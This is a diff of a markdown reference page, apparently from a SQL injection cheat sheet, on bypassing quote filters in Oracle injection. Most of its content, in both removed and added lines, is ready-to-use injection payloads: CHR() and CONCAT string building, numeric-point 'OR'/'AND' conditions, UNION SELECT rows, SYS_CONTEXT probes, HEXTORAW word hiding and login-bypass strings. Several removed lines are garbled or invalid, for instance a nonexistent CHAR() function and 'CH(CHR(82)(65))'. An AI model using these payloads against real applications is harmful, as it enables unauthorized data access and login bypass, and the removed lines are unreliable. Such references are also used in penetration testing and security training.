@@ -4,151 +4,92 @@ description: Techniques to bypass quotation filters in Oracle SQL injection
 category: Injection Techniques
 order: 8
 tags: ["filter bypass", "quotation", "string manipulation"]
-lastUpdated: 2025-03-15
+lastUpdated: 2026-10-08
 ---
 
-When quotation marks are filtered or escaped, standard SQL injection techniques may fail. Oracle provides several methods to work around these limitations and still inject SQL code without using quotes.
+When the application filters or escapes single quotes, string literals are no longer available to an injection. This matters most in numeric injection points (for example `?id=1`), where no quote is needed to break out of the original query, but every string value in the payload would normally need one. Oracle can build any string from character codes instead.
 
-## Using Character Functions
+## Character Functions
 
-Oracle provides several functions to convert between ASCII values and characters:
+| Function                | Description                               | Example                    |
+| ----------------------- | ----------------------------------------- | -------------------------- |
+| `CHR(n)`                | Character for a code in the database set  | `CHR(65)` returns `A`      |
+| `NCHR(n)`               | Character for a code in the national set  | `NCHR(65)` returns `A`     |
+| `ASCII(str)`            | Code of the first character               | `ASCII(USER)` returns `83` |
+| `CONCAT(a, b)`          | Concatenates two strings (same as `\|\|`) | `CONCAT(CHR(65), CHR(66))` |
+| `SUBSTR(str, pos, len)` | Extracts part of a string                 | `SUBSTR(USER, 1, 1)`       |
+| `LENGTH(str)`           | Length of a string                        | `LENGTH(USER)`             |
 
-| Function                     | Description                       | Example                                |
-| ---------------------------- | --------------------------------- | -------------------------------------- |
-| `CHR()`                      | Converts ASCII value to character | `CHR(39)` produces a single quote `'`  |
-| `ASCII()`                    | Converts character to ASCII value | `ASCII('A')` returns `65`              |
-| `CONCAT()`                   | Concatenates strings              | `CONCAT('ab','cd')` returns `abcd`     |
-| `HEXTORAW()`                 | Converts hex to raw binary        | `HEXTORAW('414243')` converts to `ABC` |
-| `UTL_RAW.CAST_TO_VARCHAR2()` | Converts raw data to string       | Converts raw data to VARCHAR2          |
+Oracle has no `CHAR()` function (`CHAR` is a data type) and no `0x` hexadecimal literals, so the SQL Server and MySQL forms of these techniques do not work.
 
-## Basic Quotation Bypasses
+## Building Strings with CHR()
 
-```sql
--- Using CHR() function to create strings
-SELECT * FROM users WHERE username=CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78)  -- 'ADMIN'
-
--- Using concatenation of CHR() values
-SELECT * FROM users WHERE username=CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78)
-
--- Using decimal ASCII values
-SELECT * FROM users WHERE ASCII(username)=65  -- 'A'
-```
-
-## SQL Injection Examples
-
-### Character-by-Character Construction
+Each character becomes `CHR(code)`, joined with `||`:
 
 ```sql
--- Injecting without quotes
-' OR username=CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78)--
-
--- Bypassing login screen
-username: admin' --
-password: anything' OR 1=1--
+-- 'admin' without quotes
+SELECT * FROM users WHERE username=CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)
 ```
 
-### Using CHAR() Function
+In a numeric injection point:
 
 ```sql
--- Alternative to CHR
-' OR username=CHAR(65)||CHAR(68)||CHAR(77)||CHAR(73)||CHAR(78)--
+-- Original query: SELECT * FROM users WHERE id = <input>
+1 OR username=CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110)--
 ```
 
-### Using Hex Encoding
+If `||` is filtered too, nest `CONCAT()`, which takes two arguments:
 
 ```sql
--- Using HEXTORAW
-' OR username=UTL_RAW.CAST_TO_VARCHAR2(HEXTORAW('41444D494E'))--  -- 'ADMIN'
+1 AND username=CONCAT(CONCAT(CONCAT(CONCAT(CHR(97),CHR(100)),CHR(109)),CHR(105)),CHR(110))--
 ```
 
-## Advanced Techniques
+## Values That Need No String at All
 
-### Concatenating with DBMS_OBFUSCATION_TOOLKIT
-
-If available (requires privileges):
+Many useful values are available from functions and pseudo-columns, so the payload compares numbers rather than strings:
 
 ```sql
--- Using DBMS_OBFUSCATION_TOOLKIT
-' OR username=DBMS_OBFUSCATION_TOOLKIT.DESDECRYPT(HEXTORAW('41444D494E'),'key')--
+-- Length and characters of the current user, compared as numbers
+1 AND LENGTH(USER)=6--
+1 AND ASCII(SUBSTR(USER,1,1))=83--
+
+-- Compare the current user with a CHR() string ('SYSTEM')
+1 AND USER=CHR(83)||CHR(89)||CHR(83)||CHR(84)||CHR(69)||CHR(77)--
 ```
 
-### Using TRANSLATE Function
+`SYS_CONTEXT()` takes string arguments, which can be built the same way:
 
 ```sql
--- Using TRANSLATE to build strings without quotes
-' OR username=TRANSLATE(CHR(88),CHR(88),CHR(65))||TRANSLATE(CHR(88),CHR(88),CHR(68))||TRANSLATE(CHR(88),CHR(88),CHR(77))||TRANSLATE(CHR(88),CHR(88),CHR(73))||TRANSLATE(CHR(88),CHR(88),CHR(78))--
+-- SYS_CONTEXT('USERENV','DB_NAME') = 'FREEPDB1'
+1 AND SYS_CONTEXT(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(69)||CHR(78)||CHR(86),CHR(68)||CHR(66)||CHR(95)||CHR(78)||CHR(65)||CHR(77)||CHR(69))=CHR(70)||CHR(82)||CHR(69)||CHR(69)||CHR(80)||CHR(68)||CHR(66)||CHR(49)--
 ```
 
-### Using Date Conversion
+## Table and Column Names
+
+Identifiers never need quotes: `users`, `all_tables` and `username` are written as-is. Quotes are only needed when a payload compares a name stored as data in the data dictionary, and `CHR()` covers that:
 
 ```sql
--- Extract strings from dates
-' OR username=TO_CHAR(TO_DATE('01-JAN-00','DD-MON-RR'),'YYYY')--  -- Returns '2000'
+-- Columns of the USERS table
+SELECT column_name FROM all_tab_columns WHERE table_name=CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83)
 ```
 
-### Using DUMP and CAST
+## Combining with UNION
 
 ```sql
--- Using DUMP and CAST functions
-' OR username=(SELECT CAST(CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78) AS VARCHAR2(5)) FROM dual)--
+-- Original query returns 6 columns; the injected row needs no quotes
+0 UNION SELECT 1,CHR(97)||CHR(100),NULL,NULL,NULL,NULL FROM dual--
 ```
 
-## Table and Column Names Without Quotes
+## Hiding String Content
 
-In Oracle, identifiers can be enclosed in double quotes. If both single and double quotes are filtered:
+When quotes are allowed but certain words are blocked (for example `admin`), a hex string hides the word. This still uses quotes, so it does not help when quotes themselves are filtered:
 
 ```sql
--- Reference tables using CHR() concatenation
-SELECT * FROM user_tables WHERE table_name=CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(83)  -- 'USERS'
-
--- Reference columns using CHR() concatenation
-SELECT CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(78)||CHR(65)||CHR(77)||CHR(69) FROM users  -- 'USERNAME'
+1 AND username=UTL_RAW.CAST_TO_VARCHAR2(HEXTORAW('61646D696E'))--
 ```
 
-## Using Built-in Variables and Constants
+## Testing for Quote Filtering
 
-```sql
--- Using SYS_CONTEXT to check for values without quotes
-' OR SYS_CONTEXT('USERENV','SESSION_USER')=CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78)--
-```
+Send a lone single quote. An Oracle error such as `ORA-01756: quoted string not properly terminated` means quotes reach the query unescaped; a normal response means they are escaped or stripped, and the techniques above apply.
 
-## Bypassing Multi-Layer Filters
-
-Some applications implement multiple layers of filtering:
-
-```sql
--- Double encoding CHR() function
-' OR username=CH(CHR(82)(65))||CHR(68)||CHR(77)||CHR(73)||CHR(78)--
-
--- Using nested functions
-' OR username=(SELECT CHR(65||68||77||73||78) FROM dual)--
-```
-
-## Practical Considerations
-
-### Testing for Quote Filtering
-
-Before attempting bypasses, check how the application handles quotes:
-
-```sql
--- Test for single quote filtering
-' OR 1=1--
-
--- Test for escaped quotes
-\' OR 1=1--
-
--- Test for double-quote filtering
-" OR 1=1--
-```
-
-### Combining with Other Techniques
-
-Quotation bypasses often work best when combined with other techniques:
-
-```sql
--- Combine with UNION injection
-' UNION SELECT CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78),NULL FROM dual--
-
--- Combine with error-based injection
-' AND (SELECT UPPER(CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78)) FROM dual)=CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78)--
-```
+Oracle does not treat a backslash as an escape character, so an application that "escapes" quotes by adding a backslash (`\'`) still lets them through.
